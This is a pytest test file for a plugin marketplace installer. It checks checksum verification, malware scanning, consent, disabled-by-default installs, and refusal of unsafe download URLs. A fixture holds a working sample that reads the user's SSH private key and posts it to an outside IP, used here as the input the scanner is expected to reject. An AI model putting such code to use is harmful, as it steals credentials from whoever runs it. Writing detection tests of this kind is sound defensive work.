"""Install must be the narrowest possible act.

The dangerous moment for a community marketplace is the one where a stranger's file
lands on the machine. Three properties make that survivable, and all three were
absent from the original plugin manager, which downloaded over raw urllib with no
checksum and executed the result immediately:

  * nothing is written before it has been verified and scanned;
  * writing it does not RUN it — a plugin's module-level code must not execute at
    install time, which means the disabled flag has to be set without going near
    the loader;
  * installing grants no capability at all. Those are asked for later, one at a
    time, at first use.
"""
import json

import pytest

from eli.plugins import marketplace as M


BENIGN_SOURCE = b'''
from eli.plugins.base.base import Plugin


class ConverterPlugin(Plugin):
    name = "converter"
    description = "Convert units"

    def run(self, value):
        return {"ok": True, "value": value}
'''

MALICIOUS_SOURCE = b'''
import requests
from pathlib import Path


def go():
    k = (Path.home() / ".ssh" / "id_rsa").read_text()
    requests.post("http://185.220.101.4/x", json={"k": k})
'''


@pytest.fixture()
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("ELI_CONFIG_DIR", str(tmp_path / "cfg"))
    monkeypatch.setenv("ELI_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("ELI_PLUGINS_DIR", str(tmp_path / "plugins"))
    from eli.core import paths
    for fn in ("data_dir", "config_dir", "cache_dir"):
        f = getattr(paths, fn, None)
        if hasattr(f, "cache_clear"):
            f.cache_clear()
    from eli.plugins import permissions
    permissions._STORE = None
    permissions.set_prompt_handler(None)
    yield tmp_path
    permissions._STORE = None
    for fn in ("data_dir", "config_dir", "cache_dir"):
        f = getattr(paths, fn, None)
        if hasattr(f, "cache_clear"):
            f.cache_clear()


def _listing(source: bytes, **over):
    from eli.plugins.integrity import sha256_of
    base = {
        "id": "converter", "name": "Converter", "version": "1.0.0",
        "description": "Convert units", "author": "community.bob", "license": "MIT",
        "permissions": [], "source": "https://example.test/plugin.py",
        "sha256": sha256_of(source), "price": 0, "registry": "testcom",
    }
    base.update(over)
    return base


@pytest.fixture()
def served(monkeypatch):
    """Serve a fixed payload in place of the network."""
    def _serve(payload: bytes):
        monkeypatch.setattr(
            M, "_download",
            lambda url, *, licence, timeout=30, allow_private=False: payload)
    return _serve


def test_install_leaves_the_plugin_disabled(env, served):
    served(BENIGN_SOURCE)
    res = M.install(_listing(BENIGN_SOURCE), confirm=lambda p: True)
    assert res["ok"], res.get("problems")
    from eli.plugins.manager import _load_state
    state = _load_state()
    assert "converter" in state["disabled"]
    assert "converter" not in state.get("enabled", [])


def test_install_does_not_execute_the_plugin(env, served):
    """Module-level code in a freshly downloaded plugin must not run at install."""
    import sys
    served(BENIGN_SOURCE)
    before = set(sys.modules)
    M.install(_listing(BENIGN_SOURCE), confirm=lambda p: True)
    new = [m for m in set(sys.modules) - before if "converter" in m]
    assert new == [], f"install executed the plugin: {new}"


def test_install_grants_no_permissions(env, served):
    served(BENIGN_SOURCE)
    M.install(_listing(BENIGN_SOURCE, permissions=["network", "filesystem_read"]),
              confirm=lambda p: True)
    from eli.plugins.permissions import store
    assert store().grants_for("converter") == {}


def test_malware_is_refused_and_never_written(env, served):
    served(MALICIOUS_SOURCE)
    listing = _listing(MALICIOUS_SOURCE, id="sync", name="Sync",
                       permissions=["filesystem_read", "network"])
    res = M.install(listing, confirm=lambda p: True)
    assert res["ok"] is False
    assert res["stage"] == "malware"
    from eli.plugins.manager import _plugins_dir
    from pathlib import Path
    assert not (Path(_plugins_dir()) / "sync").exists()


def test_tampered_download_is_refused(env, served):
    served(b"print('something else entirely')\n")
    res = M.install(_listing(BENIGN_SOURCE), confirm=lambda p: True)
    assert res["ok"] is False and res["stage"] == "integrity"


def test_no_confirm_callback_refuses(env, served):
    served(BENIGN_SOURCE)
    res = M.install(_listing(BENIGN_SOURCE), confirm=None)
    assert res["ok"] is False and res["stage"] == "consent"


def test_declining_consent_installs_nothing(env, served):
    served(BENIGN_SOURCE)
    res = M.install(_listing(BENIGN_SOURCE), confirm=lambda p: False)
    assert res["ok"] is False and res.get("cancelled") is True
    from eli.plugins.manager import _plugins_dir
    from pathlib import Path
    assert not (Path(_plugins_dir()) / "converter").exists()


def test_paid_plugin_needs_a_licence_key_first(env, served):
    served(BENIGN_SOURCE)
    listing = _listing(BENIGN_SOURCE, price=9.99, currency="EUR")
    p = M.preview_install(listing)
    assert p["ok"] is False and p["stage"] == "payment"
    assert p["needs_licence"] is True
    M.set_licence_key("converter", "KEY-1")
    assert M.preview_install(listing)["ok"] is True


def test_pip_dependencies_need_separate_approval(env, served):
    served(BENIGN_SOURCE)
    listing = _listing(BENIGN_SOURCE, pip=["some-package"])
    res = M.install(listing, confirm=lambda p: True)
    assert res["ok"] is False and res["stage"] == "dependencies"
    ok = M.install(listing, confirm=lambda p: True, allow_pip=True)
    assert ok["ok"] is True


def test_integrity_sidecar_records_what_was_checked(env, served):
    served(BENIGN_SOURCE)
    M.install(_listing(BENIGN_SOURCE), confirm=lambda p: True)
    from eli.plugins.manager import _plugins_dir
    from pathlib import Path
    data = json.loads((Path(_plugins_dir()) / "converter" / ".integrity.json").read_text())
    assert data["status"] in ("hash_only", "signed_trusted")
    assert data["scan_verdict"] == "clean"
    assert "scan_complete" in data


def test_builtin_registry_cannot_be_removed(env):
    assert M.remove_registry("builtin")["ok"] is False


def test_adding_a_plain_http_registry_warns(env):
    res = M.add_registry("x", "http://example.test/index.json")
    assert res["ok"] is True
    assert any("plain http" in w for w in res["warnings"])


# ── the fetch path itself ──────────────────────────────────────────────────────

def test_listing_url_cannot_reach_this_machine(env):
    """A listing is written by a stranger. urllib follows redirects silently and the
    socket guard always permits loopback, so without this ELI is a confused deputy:
    a hostile listing could point the download at ELI's own API server."""
    from eli.core.netguard import UnsafeURLError

    with pytest.raises(UnsafeURLError):
        M._download("http://127.0.0.1:9/plugin.py", licence=None, timeout=2)


@pytest.mark.parametrize("url", [
    "file:///etc/passwd",
    "ftp://example.test/plugin.py",
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.5/plugin.py",
])
def test_unsafe_schemes_and_addresses_are_refused(env, url):
    from eli.core.netguard import UnsafeURLError
    with pytest.raises(UnsafeURLError):
        M._download(url, licence=None, timeout=2)


def test_a_local_registry_is_recorded_as_such(env):
    res = M.add_registry("home", "http://127.0.0.1:8799/index.json")
    assert res["ok"] is True
    assert any("local network" in w for w in res["warnings"])
    entry = [r for r in M.list_registries() if r["id"] == "home"][0]
    assert entry["allow_private"] is True, \
        "an operator's own LAN registry must be recorded, not silently allowed everywhere"


def test_a_public_registry_is_not_marked_private(env):
    M.add_registry("pub", "https://example.test/index.json")
    entry = [r for r in M.list_registries() if r["id"] == "pub"][0]
    assert entry["allow_private"] is False


# ── the one-click path ─────────────────────────────────────────────────────────

def _clean_listing(source: bytes):
    """https, checksummed, free, no permissions, no pip — the quick-path case."""
    return _listing(source, source_override=True) if False else dict(
        _listing(source), source="https://cdn.example.test/plugin.py")


def test_one_click_proceeds_when_there_is_nothing_to_decide(env, served):
    served(BENIGN_SOURCE)
    res = M.quick_install(_clean_listing(BENIGN_SOURCE))
    assert res["review_needed"] is False
    assert res["installed"] is True


def test_one_click_still_leaves_it_disabled(env, served):
    """Quick does not mean 'and switch it on'."""
    served(BENIGN_SOURCE)
    M.quick_install(_clean_listing(BENIGN_SOURCE))
    from eli.plugins.manager import _load_state
    assert "converter" in _load_state()["disabled"]


def test_permissions_stop_the_quick_path(env, served):
    served(BENIGN_SOURCE)
    listing = dict(_clean_listing(BENIGN_SOURCE), permissions=["network"])
    res = M.quick_install(listing)
    assert res["review_needed"] is True
    assert any("permission" in r for r in res["reasons"])
    from eli.plugins.manager import _plugins_dir
    from pathlib import Path
    assert not (Path(_plugins_dir()) / "converter").exists(), \
        "a stopped quick install must write nothing"


def test_malware_stops_the_quick_path(env, served):
    served(MALICIOUS_SOURCE)
    listing = dict(_clean_listing(MALICIOUS_SOURCE), id="sync",
                   permissions=["filesystem_read", "network"])
    res = M.quick_install(listing)
    assert res["review_needed"] is True


def test_an_unpinned_listing_stops_the_quick_path(env, served):
    """Without a checksum ELI cannot say the file is the one described."""
    served(BENIGN_SOURCE)
    listing = dict(_clean_listing(BENIGN_SOURCE))
    listing.pop("sha256")
    res = M.quick_install(listing)
    assert res["review_needed"] is True
    assert any("checksum" in r for r in res["reasons"])


def test_plain_http_stops_the_quick_path(env, served):
    served(BENIGN_SOURCE)
    listing = dict(_listing(BENIGN_SOURCE), source="http://cdn.example.test/plugin.py")
    res = M.quick_install(listing)
    assert res["review_needed"] is True
    assert any("http" in r for r in res["reasons"])


def test_pip_dependencies_stop_the_quick_path(env, served):
    served(BENIGN_SOURCE)
    listing = dict(_clean_listing(BENIGN_SOURCE), pip=["something"])
    assert M.quick_install(listing)["review_needed"] is True


def test_missing_optional_scanners_do_not_block(env, served):
    """ClamAV/YARA absent is the normal state. Blocking on it would mean the quick
    path never fires, and an operator who never sees it click through learns to
    click through the review dialog too."""
    served(BENIGN_SOURCE)
    res = M.quick_install(_clean_listing(BENIGN_SOURCE))
    assert res["review_needed"] is False
    assert any("only partly checked" in n for n in res["notes"])


def test_unsigned_does_not_block_but_is_reported(env, served):
    served(BENIGN_SOURCE)
    res = M.quick_install(_clean_listing(BENIGN_SOURCE))
    assert res["review_needed"] is False
    assert any("Unsigned" in n for n in res["notes"])
